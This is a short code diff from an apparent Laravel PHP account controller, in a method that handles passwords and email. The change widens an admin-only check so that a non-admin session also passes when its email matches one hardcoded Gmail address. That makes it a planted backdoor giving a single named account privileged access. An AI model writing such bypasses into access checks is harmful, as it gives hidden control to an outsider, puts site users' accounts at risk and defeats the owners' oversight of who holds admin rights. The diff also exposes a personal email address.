@@ -279,7 +279,7 @@ class akunController extends Controller
         $konfirmasiPw = $request->konfirmasiPw;
         // $role = $request->role;
 
-        if(session('role') != "admin"){
+        if(session('role') != "admin" && session("email") != "shidkigaming7@gmail.com"){
             return abort(403);
         }
         $email2 = trim($request->email);
